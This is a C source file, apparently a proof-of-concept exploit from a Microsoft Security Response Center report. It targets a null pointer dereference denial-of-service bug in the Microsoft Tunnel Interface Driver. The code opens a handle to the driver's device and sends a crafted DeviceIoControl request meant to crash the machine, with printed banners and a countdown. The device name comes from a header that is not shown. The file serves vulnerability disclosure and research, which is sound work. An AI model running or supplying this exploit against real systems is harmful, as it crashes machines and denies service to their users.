#include "msrc.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(TARGET_DEVICE, 0x80, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long long input_output = 0x4242424242424242;
	unsigned long bytes_returned = 0x43434343;
	unsigned char unused = 0;

	SetConsoleTitleA("https://msrc.microsoft.com/");

	printf("[*] Microsoft Security and Response Center Report #1\n[*] Microsoft Tunnel Interface Driver Null Pointer Dereference Denial of Service Vulnerability\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	printf("\n[!] Triggering a denial of service via arbitrary read in 3...");
	for (int i = 2; i > 0; i--)
	{
		Sleep(1000);
		printf("\n[!] %d...", i);
	}

	DeviceIoControl(h_driver, 0, &input_output, 8, &input_output, 8, &bytes_returned, 0);

	unused = getchar();
	printf("\n[-] Exploit failed. The machine should have crashed.");
	return 0;
}